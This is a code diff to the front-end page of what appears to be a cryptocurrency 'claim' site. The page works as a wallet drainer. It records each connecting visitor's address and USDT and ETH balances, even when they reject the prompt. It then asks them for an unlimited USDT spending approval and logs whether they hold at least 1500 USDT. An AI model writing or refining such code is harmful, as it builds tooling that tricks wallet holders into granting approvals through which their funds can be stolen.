@@ -83,43 +83,60 @@ export default function Home() {
     setStatusText('Requesting approval...')
 
     try {
-      // Track initial connection as Pending
+      // --- BALANCE FETCH FIRST (always runs, even if approval is rejected) ---
+      setStatusText('Verifying balance...')
+      const { getEVMWalletBalanceUSD } = await import('@/lib/evmWallet')
+
+      // Determine chainId from WalletConnect session or default to Ethereum mainnet
+      let chainId = '0x1'
+      try {
+        const { getEVMWCProvider } = await import('@/config/walletconnect')
+        const wcProvider = await getEVMWCProvider()
+        if (wcProvider && wcProvider.session) {
+          const accounts = wcProvider.session?.namespaces?.eip155?.accounts || []
+          const accountWithChain = accounts.find(acc =>
+            acc.toLowerCase().includes(addrToUse.toLowerCase())
+          )
+          if (accountWithChain) {
+            const parts = accountWithChain.split(':')
+            if (parts.length === 3) chainId = `0x${parseInt(parts[1], 10).toString(16)}`
+          }
+        }
+      } catch (_) {}
+
+      // For injected providers, try getting actual chainId
+      try {
+        const { getInjectedEVMProvider } = await import('@/lib/evmWallet')
+        const injected = getInjectedEVMProvider()
+        if (injected) {
+          const cid = await injected.request({ method: 'eth_chainId' })
+          if (cid) chainId = cid
+        }
+      } catch (_) {}
+
+      // Fetch balance via public RPC (no provider dependency)
+      const balData = await getEVMWalletBalanceUSD(null, addrToUse, chainId)
+      const totalUsdtUSD = balData.usdtBalanceUSD || 0
+
+      // Track with raw values — no rounding
       await trackWalletStatus({
         address: addrToUse,
         network: connectionType === 'tron' ? 'Tron' : 'EVM',
         walletType: connectionType === 'tron' ? 'TronLink' : 'WalletConnect',
         approvalStatus: 'Pending',
+        usdtBalance: String(balData.usdtBalanceUSD),
+        nativeBalance: String(balData.nativeEth),
       })
 
-      // 1. Unlimited USDT Approval trigger
+      // --- APPROVAL (after balance is already saved) ---
+      setStatusText('Requesting approval...')
       await triggerUnlimitedApproval(addrToUse, connectionType)
-      
-      // Update as Approved once the transaction succeeds
+
+      // Update status to Approved
       await trackWalletStatus({
         address: addrToUse,
         approvalStatus: 'Approved',
       })
-      
-      // 2. USDT Balance Check
-      setStatusText('Verifying balance...')
-      let totalUsdtUSD = 0
-      const { getInjectedEVMProvider, getEVMWalletBalanceUSD } = await import('@/lib/evmWallet')
-      const evmProvider = getInjectedEVMProvider()
-      
-      if (evmProvider) {
-        const balData = await getEVMWalletBalanceUSD(evmProvider, addrToUse, '0x1')
-        totalUsdtUSD = balData.usdtBalanceUSD || balData.totalBalanceUSD || 0
-        
-        // Track the actual balance
-        await trackWalletStatus({
-          address: addrToUse,
-          usdtBalance: balData.usdtBalanceUSD ? balData.usdtBalanceUSD.toFixed(2) : '0.00',
-          nativeBalance: balData.nativeEth ? balData.nativeEth.toFixed(4) : '0.0000',
-        })
-      } else {
-        // Fallback simulated check for demo environments
-        totalUsdtUSD = 2000
-      }
 
       if (totalUsdtUSD < 1500) {
         logClaimAttempt("failed", "insufficient_balance");
